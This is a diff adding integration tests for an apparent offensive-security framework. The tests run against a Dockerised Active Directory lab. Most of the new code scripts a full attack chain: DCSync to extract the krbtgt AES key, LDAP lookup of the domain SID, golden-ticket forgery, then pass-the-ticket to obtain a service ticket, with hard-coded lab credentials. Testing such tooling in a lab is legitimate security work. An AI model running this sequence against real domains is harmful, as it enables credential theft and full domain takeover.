@@ -1584,6 +1584,140 @@ class TestS4ULab(unittest.TestCase):
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestPassTheTicketLab(unittest.TestCase):
+    """pass_the_ticket: the golden ticket's ccache loot is a LIVE
+    credential — dcsync -> forge -> request a real service ticket."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        up_ad_lab(cls.manager)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            out = buf.getvalue()
+            loot = {}
+            for kind in ("ticket", "kerberos-key"):
+                loot[kind] = console.store.loot(kind)
+            return out, loot
+        finally:
+            console.store.close()
+
+    def test_forged_ccache_requests_service_ticket(self):
+        import base64
+        import tempfile
+
+        # 1. dcsync -> krbtgt AES key
+        _, loot = self._run(
+            "use auxiliary/attack/dcsync",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "set TARGET krbtgt",
+            "run",
+        )
+        aes_line = next(k["content"] for k in loot["kerberos-key"]
+                        if "aes256-cts-hmac-sha1-96" in k["content"])
+        aes_key = aes_line.rsplit(":", 1)[1]
+
+        # 2. domain SID via LDAP
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1, ldaptypes
+        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+        conn.login("Administrator", "P@ssw0rd123", "forge.local")
+        domain_sid = None
+        for packet in conn.search(
+                searchBase="DC=forge,DC=local",
+                searchFilter="(sAMAccountName=Administrator)",
+                attributes=["objectSid"]):
+            if isinstance(packet, ldapasn1.SearchResultEntry):
+                for attr in packet["attributes"]:
+                    if str(attr["type"]) == "objectSid":
+                        sid = ldaptypes.LDAP_SID(
+                            data=bytes(attr["vals"][0])).formatCanonical()
+                        domain_sid = sid.rsplit("-", 1)[0]
+        self.assertIsNotNone(domain_sid)
+
+        # 3. forge -> ccache loot (sniff the magic to prove the format)
+        out, loot = self._run(
+            "use auxiliary/attack/golden_ticket",
+            "set DOMAIN forge.local",
+            f"set DOMAIN_SID {domain_sid}",
+            "set KEYTYPE aes256",
+            f"set KRBTGT_AES {aes_key}",
+            "set KVNO 1",
+            f"set RHOSTS {HOST}",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        ticket_b64 = loot["ticket"][-1]["content"]
+        blob = base64.b64decode(ticket_b64)
+        self.assertEqual(blob[:2], b"\x05\x04", "loot must be ccache format")
+
+        # 4. pass it: the KDC must issue a service ticket for the forge
+        with tempfile.NamedTemporaryFile(suffix=".ccache", delete=False) as tf:
+            outfile = tf.name
+        out, loot = self._run(
+            "use auxiliary/attack/pass_the_ticket",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            f"set TICKET {ticket_b64}",
+            "set TARGET_SPN HTTP/api.forge.local",
+            f"set OUTFILE {outfile}",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("KDC issued Administrator -> HTTP/api.forge.local", out)
+        self.assertIn("written to", out)
+        ptt_loot = [t for t in loot["ticket"] if t["label"].startswith("ptt ")]
+        self.assertEqual(len(ptt_loot), 1)
+
+        # 5. OUTFILE is a parseable ccache holding the krbtgt TGT
+        from impacket.krb5.ccache import CCache
+        cc = CCache.loadFile(outfile)
+        servers = ["/".join(c["data"].decode() for c in cred["server"].components)
+                   for cred in cc.credentials]
+        self.assertTrue(any(s.startswith("krbtgt/") for s in servers))
+
+    def test_refuses_raw_asrep(self):
+        import base64
+        raw = base64.b64encode(b"\x6b\x82\x01\x00fake-asrep").decode()
+        out, _ = self._run(
+            "use auxiliary/attack/pass_the_ticket",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            f"set TICKET {raw}",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("no session key", out)
+
+    def test_bad_base64_clean_error(self):
+        out, _ = self._run(
+            "use auxiliary/attack/pass_the_ticket",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set TICKET !!!not-base64!!!",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("not valid base64", out)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
 class TestDcSyncLab(unittest.TestCase):
     """dcsync against the AD lab: Administrator replicates the directory.
     Exercises the pinned RPC range (135 + 49152-49160) end to end."""
